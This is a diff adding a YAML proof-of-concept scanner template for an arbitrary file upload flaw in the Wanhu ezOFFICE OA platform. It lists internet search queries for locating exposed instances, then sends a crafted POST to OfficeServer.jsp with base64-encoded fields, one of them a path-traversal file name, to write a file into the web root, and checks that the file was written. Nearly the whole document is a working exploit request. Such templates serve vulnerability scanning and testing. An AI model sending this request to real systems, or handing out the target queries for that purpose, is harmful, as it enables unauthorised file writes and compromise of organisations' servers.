@@ -1,0 +1,47 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 
+    
+name: poc-yaml-wanhu-ezoffice-OfficeServer.jsp-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /defaultroot/public/iWebOfficeSign/OfficeServer.jsp
+            headers:
+              Accept: text/html, application/xhtml+xml, image/jxr, */*
+              Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
+              Accept-Encoding: gzip, deflate
+              Connection: close
+              Content-Length: 244
+            body: "DBSTEP V3.0     170              0                26              DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=Li4vLi4vcHVibGljL2VkaXQvNG5kZXgudHh0\r\n1111111111111111111111111111111111111111111111\r\n4ra1n"            
+        expression: response.status == 200 && response.body_string.contains("DBSTEP V3.0")
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/public/edit/4ndex.txt
+            headers:
+            body:   
+        expression: response.status == 200 && response.body_string.contains("4ra1n")
+
+
+expression: r0() && r1()
